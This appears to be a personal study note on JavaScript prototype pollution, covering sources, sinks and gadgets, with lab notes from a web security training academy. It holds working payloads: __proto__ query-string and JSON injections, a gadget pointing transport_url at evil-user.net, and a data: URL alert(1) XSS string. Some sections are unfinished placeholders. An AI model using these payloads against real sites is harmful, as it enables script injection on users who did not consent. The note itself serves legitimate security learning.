# JS Prototype Pollution

Prototype pollution is a JavaScript vulnerability that enables an attacker to add arbitrary properties to global object prototypes, which may then be inherited by user-defined objects.

## Prototype Pollution Sources

- The URL via query or fragment
- JSON-based input
- Web messages

### Via the URL

```
https://test.com/?__proto__[foo]=bar
```

### Via JSON

```
{
	"__proto__": {
		"evilProperty": "payload"
	}
}
```

## Prototype Pollution Sources

A prototype pollution sink is essentially just a JavaScript function or DOM element that you're able to access via prototype pollution, which enables you to execute arbitrary JavaScript or system commands. We've covered some client-side sinks extensively in our topic on DOM XSS.

Largely trial and error

## Prototype Pollution Gadgets

A gadget provides a means of turning the prototype pollution vulnerability into an actual exploit. This is any property that is:

- Used by the application in an unsafe way, such as passing it to a sink without proper filtering or sanitization.
    
- Attacker-controllable via prototype pollution. In other words, the object must be able to inherit a malicious version of the property added to the prototype by an attacker.

### Examples

```
https://vulnerable-website.com/?__proto__[transport_url]=//evil-user.net
```

```
https://vulnerable-website.com/?__proto__[transport_url]=data:,alert(1);//
```

## Testing for client-side prototype pollution sources

Try to inject an arbitrary property via the query string

```
target.com/?__proto__[foo]=bar
```

Check in the console if the the prototype has been polluted

```
Object.prototype.foo
```

If that doesn't work, try a different method

```
target.com/?__proto__.foo=bar
```

Try sending in JSON

```
"__proto__":{
	"foo":"bar"
}
```

## Finding client-side prototype pollution gadgets manually

Placeholder

## Labs

### DOM XSS via client-side prototype pollution

![[image-1.png]]

```
0a2c00e903b91645815ec10100cd001c.web-security-academy.net/?__proto__[transport_url]=data:,alert(1);//
```

### DOM XSS via an alternative prototype pollution vector

